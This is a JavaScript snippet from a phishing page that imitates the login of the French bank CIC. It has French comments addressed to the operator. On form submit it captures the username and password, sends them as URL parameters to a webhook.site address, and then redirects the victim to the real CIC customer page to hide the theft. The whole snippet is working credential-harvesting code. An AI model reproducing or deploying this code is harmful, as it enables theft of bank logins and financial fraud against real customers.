    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // 🔽 TON WEBHOOK URL ICI 🔽
            const webhookUrl = 'https://webhook.site/aa3ef8a4-4344-45c9-ae08-8302184367b8'; 
            
            // Envoi des données à toi
            fetch(webhookUrl + '?user=' + encodeURIComponent(username) + '&pass=' + encodeURIComponent(password))
                .then(() => {
                    // Redirection vers la vraie page CIC pour la forme
                    window.location.href = 'https://www.cic.fr/espace-client';
                })
                .catch(error => console.error('Erreur:', error));
        });
    </script>
